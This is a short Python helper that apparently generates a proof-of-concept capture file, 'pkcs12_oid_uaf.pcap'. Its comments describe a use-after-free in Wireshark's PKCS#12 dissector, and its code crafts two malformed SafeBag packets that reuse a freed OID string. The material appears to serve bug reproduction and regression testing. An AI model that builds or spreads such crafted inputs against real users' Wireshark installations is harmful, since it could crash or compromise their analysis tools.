#!/usr/bin/env python3
# Helper module for the pkcs12 capture generator
#
# Wireshark - Network traffic analyzer
# By Gerald Combs <gerald@wireshark.org>
# Copyright 1998 Gerald Combs
#
# SPDX-License-Identifier: GPL-2.0-or-later

# PKCS#12: file-scope "object_identifier_id" (packet-pool string set by
# SafeBag/bagId etc.) is never reset. Frame 1 (Exported PDU "cms",
# ContentInfo id-safeContentsBag) sets it. Frame 2 has a SafeBag whose
# bagId is missing (a NULL in its place is skipped as a wrong field), so
# bagValue calls call_ber_oid_callback() with the freed string from frame 1.
from s8ber import tlv, oid, exp_pdu, write_pcap

SAFE_CONTENTS = '1.2.840.113549.1.12.10.1.6'
LONG_OID = '1.3.6.1.4.1.99999.' + '.'.join(str(1000 + i) for i in range(20))

def cms(content):
    return tlv(0x30, oid(SAFE_CONTENTS) + tlv(0xa0, content))

bag1 = tlv(0x30, oid(LONG_OID) + tlv(0xa0, b'\x05\x00'))
bag2 = tlv(0x30, b'\x05\x00' + tlv(0xa0, b'\x04\x02AB'))
pkts = [exp_pdu('cms', cms(tlv(0x30, bag1))),
        exp_pdu('cms', cms(tlv(0x30, bag2)))]
write_pcap('pkcs12_oid_uaf.pcap', pkts)
